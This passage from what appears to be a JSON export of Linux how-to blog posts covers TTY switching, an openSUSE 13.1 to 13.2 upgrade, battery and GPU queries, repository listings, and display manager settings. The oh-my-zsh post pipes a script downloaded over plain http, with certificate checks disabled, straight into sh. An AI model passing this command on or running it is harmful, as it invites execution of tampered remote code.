retro-compatible as possible.","categories":[{"name":"news","slug":"news","permalink":"https://rawsec.ml/categories/news/"}],"tags":[{"name":"news","slug":"news","permalink":"https://rawsec.ml/tags/news/"}]},{"title":"How to change of terminal in command-line with Linux","slug":"change-terminal-command-line","date":"2015-09-17T22:00:00.000Z","updated":"2017-02-07T18:23:37.185Z","comments":true,"path":"en/change-terminal-command-line/","link":"","permalink":"https://rawsec.ml/en/change-terminal-command-line/","excerpt":"","text":"Changing of TTY (TeleTYpewriter), text console or text terminal without keyboard shortcut may be useful for remote administration or virtualization. So to change of TTY in CLI (Command-Line Interface) you need root power: 1chvt N where N is the terminal number. And if you want to know witch terminal you are using you can use: 1fgconsole","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"}]},{"title":"Migrate from openSUSE 13.1 to openSUSE 13.2","slug":"migrate-from-opensuse-13-1-to-opensuse-13-2","date":"2014-11-19T23:00:00.000Z","updated":"2017-02-07T18:23:36.928Z","comments":true,"path":"en/migrate-from-opensuse-13-1-to-opensuse-13-2/","link":"","permalink":"https://rawsec.ml/en/migrate-from-opensuse-13-1-to-opensuse-13-2/","excerpt":"","text":"Check that update repository is existing and activated, so display repository list with URLs display: zypper repos --uri. Check you have this repository: 123# | Alias | Name | Enabled | Refresh | URI---+-----------------+-----------------+---------+---------+---------------------------------------1 | repo-update | repo-update | Yes | Yes | http://download.opensuse.org/update/13.1/ If it is not enabled, activate it: zypper modifyrepo --enable repo-update. If it is not existing, add it: zypper addrepo --check --refresh --name 'openSUSE-13.1-Update' http://download.opensuse.org/update/13.1/ repo-update Refresh and update repositories: zypper refresh and zypper update. Check the repository list: zypper lr. We'll need to remove all unofficial repositories one by one: zypper rr alias. Save old repositories and put new ones: 12cp -Rv /etc/zypp/repos.d /etc/zypp/repos.d.Oldsed -i &apos;s/13\\.1/13.2/g&apos; /etc/zypp/repos.d/* Refresh repositories again: zypper refresh. Prefer tty1 (foreground virtual terminal) over X Session for the upgrade (CTRL+ALT+F1 or sudo chvt 1). During the upgrade DO NOT shutdown and DON'T interrupt Internet connexion or you can broke your system. Start the distribution upgrade: zypper dup Source: openSUSE.org","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"https://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"opensuse","slug":"opensuse","permalink":"https://rawsec.ml/tags/opensuse/"}]},{"title":"Install Oh-my-zsh on openSUSE","slug":"install-oh-my-zsh-opensuse","date":"2014-10-23T22:00:00.000Z","updated":"2017-02-07T18:23:36.885Z","comments":true,"path":"en/install-oh-my-zsh-opensuse/","link":"","permalink":"https://rawsec.ml/en/install-oh-my-zsh-opensuse/","excerpt":"","text":"Install zsh zypper in zsh and git zypper in git. Then install oh-my-zsh wget --no-check-certificate http://install.ohmyz.sh -O - | sh. Then define zsh as your default shell: chsh -s /bin/zsh.","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"https://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"opensuse","slug":"opensuse","permalink":"https://rawsec.ml/tags/opensuse/"}]},{"title":"Learn Linux: Help","slug":"learn-linux-help","date":"2014-09-06T22:00:00.000Z","updated":"2017-02-07T18:23:37.165Z","comments":true,"path":"en/learn-linux-help/","link":"","permalink":"https://rawsec.ml/en/learn-linux-help/","excerpt":"","text":"What is the man? Let's see what it says itself: 1234$ man -f manman (1) - an interface to the on-line reference manualsman (7) - macros to format man pagesman (1p) - display system documentation Command Description man Explanation manual for commands and files man -f or whatis Short description for a command man -k or apropos Commands list containing the argument keyword Examples: 1234567891011$ man -f unzipunzip (1) - list, test and extract compressed files in a ZIP archive$ man -k unzipbunzip2 (1) - a block-sorting file compressor, v1.0.6funzip (1) - filter for extracting from a ZIP archive in a pipegunzip (1) - compress or expand fileshunzip (1) - decompress and decrypt hzip files to the standard outputmtx-unzip (1) - (sujet inconnu)unzip (1) - list, test and extract compressed files in a ZIP archiveunzipsfx (1) - self-extracting stub for prepending to ZIP archives","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"}]},{"title":"Know status and health battery in command-line","slug":"know-status-health-battery-command-line","date":"2014-08-02T22:00:00.000Z","updated":"2017-02-07T18:23:36.872Z","comments":true,"path":"en/know-status-health-battery-command-line/","link":"","permalink":"https://rawsec.ml/en/know-status-health-battery-command-line/","excerpt":"","text":"To see your battery infos you can use acpi if you have it or directly see system files. Upower command In both case you can use upower command to get some usefull infos: 1upower -i /org/freedesktop/UPower/devices/battery_BAT0 Example output: 12345678910111213141516171819202122native-path: BAT0vendor: ASUSTeKmodel: N56--52power supply: yesupdated: ven. 01 avril 2016 08:58:27 CEST (99 seconds ago)has history: yeshas statistics: yesbattery present: yes rechargeable: yes state: fully-charged warning-level: none energy: 41,162 Wh energy-empty: 0 Wh energy-full: 43,054 Wh energy-full-design: 57,2 Wh energy-rate: 0 W voltage: 12,377 V percentage: 95% capacity: 75,2692% technology: lithium-ion icon-name: &apos;battery-full-charged-symbolic&apos; With acpi Many distributions don't use it so if you want to install it you can do: 1sudo zypper in acpi OR 1sudo yum install acpi &amp;&amp; sudo yum install acpitool OR 1sudo apt-get install acpi &amp;&amp; sudo apt-get install acpitool To check is you have it installed: 1acpi -V You can see battery health: 1cat /proc/acpi/battery/BAT0/info and the battery status: 1cat /proc/acpi/battery/BAT0/state OR 1acpi You can also display ac adpter information: 1acpi -a You can show thermal information: 1acpi -t OR 1cat /proc/acpi/thermal_zone/THM/temperature Without acpi Without acpi you will need to browse /sys/class/power_supply/BAT0 directory and display files that are inside.","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"opensuse","slug":"opensuse","permalink":"https://rawsec.ml/tags/opensuse/"}]},{"title":"Display repository list in comand-line on openSUSE","slug":"display-repository-list-comand-line-openSUSE","date":"2014-08-02T22:00:00.000Z","updated":"2017-02-07T18:23:36.882Z","comments":true,"path":"en/display-repository-list-comand-line-openSUSE/","link":"","permalink":"https://rawsec.ml/en/display-repository-list-comand-line-openSUSE/","excerpt":"","text":"To display the repository list in command line you can use : 123456789101112131415161718zypper lr# | Alias | Name | Enabled | GPG Check | Refresh---+---------------------------+--------------------------------------------+---------+-----------+-------- 1 | Bumblebee | Bumblebee | No | ---- | Yes 2 | Java_packages | Factory Java packages (openSUSE_Leap_42.1) | Yes | (r ) Yes | No 3 | Nvidia | Nvidia | No | ---- | Yes 4 | devel_languages_python | Python Modules (openSUSE_Leap_42.1) | Yes | (r ) Yes | No 5 | local_RPMs | local RPMs | Yes | ( p) Yes | Yes 6 | packman | packman | Yes | (r ) Yes | Yes 7 | repo-debug | openSUSE-Leap-42.1-Debug | No | ---- | Yes 8 | repo-debug-non-oss | openSUSE-Leap-42.1-Debug-Non-Oss | No | ---- | Yes 9 | repo-debug-update | openSUSE-Leap-42.1-Update-Debug | No | ---- | Yes 10 | repo-debug-update-non-oss | openSUSE-Leap-42.1-Update-Debug-Non-Oss | No | ---- | Yes 11 | repo-non-oss | openSUSE-Leap-42.1-Non-Oss | Yes | (r ) Yes | Yes 12 | repo-oss | openSUSE-Leap-42.1-Oss | Yes | (r ) Yes | Yes 13 | repo-source | openSUSE-Leap-42.1-Source | No | ---- | Yes 14 | repo-update | openSUSE-Leap-42.1-Update | Yes | (r ) Yes | Yes 15 | repo-update-non-oss | openSUSE-Leap-42.1-Update-Non-Oss | Yes | (r ) Yes | Yes Or for more details: 123456789101112131415161718zypper lr -d# | Alias | Name | Enabled | GPG Check | Refresh | Priority | Type | URI | Service---+---------------------------+--------------------------------------------+---------+-----------+---------+----------+----------+----------------------------------------------------------------------------------------+-------- 1 | Bumblebee | Bumblebee | No | ---- | Yes | 99 | rpm-md | http://download.opensuse.org/repositories/X11:/Bumblebee/openSUSE_Leap_42.1/ | 2 | Java_packages | Factory Java packages (openSUSE_Leap_42.1) | Yes | (r ) Yes | No | 99 | rpm-md | http://download.opensuse.org/repositories/Java:/packages/openSUSE_Leap_42.1/ | 3 | Nvidia | Nvidia | No | ---- | Yes | 99 | rpm-md | ftp://download.nvidia.com/opensuse/leap/42.1/ | 4 | devel_languages_python | Python Modules (openSUSE_Leap_42.1) | Yes | (r ) Yes | No | 98 | rpm-md | http://download.opensuse.org/repositories/devel:/languages:/python/openSUSE_Leap_42.1/ | 5 | local_RPMs | local RPMs | Yes | ( p) Yes | Yes | 99 | plaindir | dir:///home/shark/localRMPS | 6 | packman | packman | Yes | (r ) Yes | Yes | 99 | rpm-md | http://ftp.gwdg.de/pub/linux/misc/packman/suse/openSUSE_Leap_42.1/ | 7 | repo-debug | openSUSE-Leap-42.1-Debug | No | ---- | Yes | 99 | NONE | http://download.opensuse.org/debug/distribution/leap/42.1/repo/oss/ | 8 | repo-debug-non-oss | openSUSE-Leap-42.1-Debug-Non-Oss | No | ---- | Yes | 99 | NONE | http://download.opensuse.org/debug/distribution/leap/42.1/repo/non-oss/ | 9 | repo-debug-update | openSUSE-Leap-42.1-Update-Debug | No | ---- | Yes | 99 | NONE | http://download.opensuse.org/debug/update/leap/42.1/oss | 10 | repo-debug-update-non-oss | openSUSE-Leap-42.1-Update-Debug-Non-Oss | No | ---- | Yes | 99 | NONE | http://download.opensuse.org/debug/update/leap/42.1/non-oss/ | 11 | repo-non-oss | openSUSE-Leap-42.1-Non-Oss | Yes | (r ) Yes | Yes | 99 | yast2 | http://download.opensuse.org/distribution/leap/42.1/repo/non-oss/ | 12 | repo-oss | openSUSE-Leap-42.1-Oss | Yes | (r ) Yes | Yes | 99 | yast2 | http://download.opensuse.org/distribution/leap/42.1/repo/oss/ | 13 | repo-source | openSUSE-Leap-42.1-Source | No | ---- | Yes | 99 | NONE | http://download.opensuse.org/source/distribution/leap/42.1/repo/oss/ | 14 | repo-update | openSUSE-Leap-42.1-Update | Yes | (r ) Yes | Yes | 99 | rpm-md | http://download.opensuse.org/update/leap/42.1/oss/ | 15 | repo-update-non-oss | openSUSE-Leap-42.1-Update-Non-Oss | Yes | (r ) Yes | Yes | 99 | rpm-md | http://download.opensuse.org/update/leap/42.1/non-oss/ | To export/save your repository list: 1sudo zypper repos -e myreposbackup.repo","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"https://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"opensuse","slug":"opensuse","permalink":"https://rawsec.ml/tags/opensuse/"}]},{"title":"Reach the command line interface (text mode) at boot time","slug":"reach-command-line-interface-text-mode-boot-time","date":"2014-08-02T22:00:00.000Z","updated":"2017-02-07T18:23:36.885Z","comments":true,"path":"en/reach-command-line-interface-text-mode-boot-time/","link":"","permalink":"https://rawsec.ml/en/reach-command-line-interface-text-mode-boot-time/","excerpt":"","text":"This work with Grub2: When you are on the bootloader, hover over your distribution name and press e (e for edit) You can now add options in the window that just opened On the line beginning with linux, add 3 at the end of the line (with a space) Press F10 to start PS : This modification is temporary, next start up openSUSE will boot normaly.:x","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"https://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"opensuse","slug":"opensuse","permalink":"https://rawsec.ml/tags/opensuse/"}]},{"title":"How to know the graphic controller under Linux","slug":"know-graphic-controller-linux","date":"2014-08-02T22:00:00.000Z","updated":"2017-02-07T18:23:37.272Z","comments":true,"path":"en/know-graphic-controller-linux/","link":"","permalink":"https://rawsec.ml/en/know-graphic-controller-linux/","excerpt":"","text":"To know your 3D graphic(s) controller(s) working (GPU or/and chipset) with your VGA output you can run the following command : 1/sbin/lspci | egrep 'VGA|3D' Example : 123/sbin/lspci | egrep 'VGA|3D'00:02.0 VGA compatible controller: Intel Corporation 3rd Gen Core processor Graphics Controller (rev 09)01:00.0 VGA compatible controller: NVIDIA Corporation GF108M [GeForce GT 630M] (rev a1)","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"graphic","slug":"graphic","permalink":"https://rawsec.ml/tags/graphic/"}]},{"title":"DISPLAYMANAGER and WINDOWSMANAGER","slug":"opensuse-displaymanager-windowsmanager","date":"2014-08-02T22:00:00.000Z","updated":"2017-02-07T18:23:36.738Z","comments":true,"path":"en/opensuse-displaymanager-windowsmanager/","link":"","permalink":"https://rawsec.ml/en/opensuse-displaymanager-windowsmanager/","excerpt":"","text":"Change of Display Manager Pass root 1sudo -i Then open /etc/sysconfig/displaymanager with a text editor. 1vim /etc/sysconfig/displaymanager Display Manager can be changed at line DISPLAYMANAGER=&quot;XXX&quot; Display Manager also called Login Manager can be modified as explained previously. Main managers are: LightDM for Unity GDM for GNOME KDM for KDE XDM for X Window Entrance for Enlightenment For more manager, see here. If you have trouble with a manager you can temporarily replace it with xdm : DISPLAYMANAGER=&quot;xdm&quot;. Change of Window Manager To change of window manager laso called desktop manager, open /etc/sysconfig/windowmanager. 1vim /etc/sysconfig/windowmanager At line DEFAULT_WM=&quot;XXX&quot;,replace XXX with one of these manager : gnome, kde, xfce, lxde, enlightenment, icewm, cinnamon. For example DEFAULT_WM=&quot;xfce&quot;. The a reboot it's needed.","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"https://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"opensuse","slug":"opensuse","permalink":"https://rawsec.ml/tags/opensuse/"}]},{"title":"How to make a bootable USB stick to install Ubuntu","slug":"install-ubuntu-from-usb-stick","date":"2012-12-17T23:00:00.000Z","updated":"2016-03-09T23:00:00.000Z","comments":true,"path":"en/install-ubuntu-from-usb-stick/","link":"","permalink":"https://rawsec.ml/en/install-ubuntu-from-usb-stick/","excerpt":"","text":"This tutorial was thinked for Windows users who want to install an easy to use Linux distibution. Before installing a Linux distribution, it's highly recommended to save all your datas. It is highly recommended to perform a defragmentation before the install in order to avoid data loss. Step n°1 : Download the last Ubuntu version You can donwload the Ubuntu Desktop iso on the official website. Step n°2 : Download the last version of Linux Live USB Creator You can find Linux Live USB Creator on the official website. Then just install it. Step n°3 : Get the USB stick ready Launch Linux Live USB Creator. Choose the USB stick where you will install Ubuntu. Choose the iso you have just downloaded in the Source tab. Let the persistence to 0. Check the option Format the stick. Clic on the lightning icon to launch the installation. Step n°4 : Boot When the USB stick is ready, insert (plug) it in a usb port and restart your computer. To access to the Boot menu of your computer see the informations at boot time and press the right key or try the more common keys Escape or F12. For older materials you may not be able to boot with USB so you will have to burn a live CD or DVD. In the Boot menu, choose your USB stick. A menu appear, choose Installation to directly install Ubuntu or Try Ubuntu to try it before installing. If you choosed Try Ubuntu you arrived on the desktop screen : You can try Ubuntu and install it when you are ready. Step n°5 : Installation This article was only about preparing the USB stick but you can find lots of tutorial on How to install Ubuntu on the web. You may find more info or method about creating bootable USB devices [here](https://help.ubuntu.com/community/Installation/FromUSBStick ).","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"ubuntu","slug":"linux/ubuntu","permalink":"https://rawsec.ml/categories/linux/ubuntu/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://rawsec.ml/tags/ubuntu/"},{"name":"install","slug":"install","permalink":"https://rawsec.ml/tags/install/"}]}]}